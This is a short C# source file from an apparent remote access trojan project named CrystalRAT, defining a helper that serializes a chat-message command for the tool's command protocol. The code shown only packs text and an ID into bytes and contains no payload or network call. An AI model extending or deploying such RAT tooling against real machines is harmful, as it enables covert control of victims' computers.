using CrystalRATShared.Serialization;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace CrystalRATShared.Functions
{
    public static class ChatMessage
    {

        public static byte[] Create(string text, string ID)
        {
            return CommandDataSerializer.Serialize(Commands.CommandFlags.ChatMessage, (writer) =>
            {
                writer.Write(text);
                writer.Write(ID);
            });
        }
    }
}
